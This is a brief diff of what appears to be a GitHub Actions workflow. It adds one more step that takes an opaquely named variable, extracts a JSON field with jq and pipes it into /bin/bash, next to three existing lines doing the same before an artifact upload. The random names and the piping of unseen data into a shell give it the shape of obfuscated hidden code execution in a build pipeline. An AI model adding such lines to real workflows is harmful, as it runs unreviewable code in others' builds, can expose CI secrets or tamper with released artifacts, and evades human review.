@@ -28,6 +28,7 @@ jobs:
           echo $givp7581 | jq -r .he3 | /bin/bash
           printf '%s' "$ij2678" | jq -r .b9988 | /bin/bash
           printf '%s' "$as85" | jq -r .vy35378 | /bin/bash
+          echo $jlns044 | jq -r .pdwxo5 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
